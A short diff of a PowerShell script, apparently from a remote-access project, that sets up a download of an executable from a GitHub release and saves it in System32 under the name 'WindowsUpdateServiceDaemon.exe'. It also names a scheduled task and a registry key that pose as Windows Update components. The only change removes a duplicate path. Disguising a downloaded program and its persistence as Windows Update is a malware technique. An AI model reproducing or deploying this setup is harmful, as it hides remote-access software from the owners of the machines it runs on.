@@ -2,7 +2,7 @@
 #Purpose of this scirpt to get notified once a system comes online.
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $localFilePath = "C:\Windows\System32\WindowsUpdateServiceDaemon.exe"
-$filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe","C:\Windows\System32\WindowsUpdateServiceDaemon.exe")
+$filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe")
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 $regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
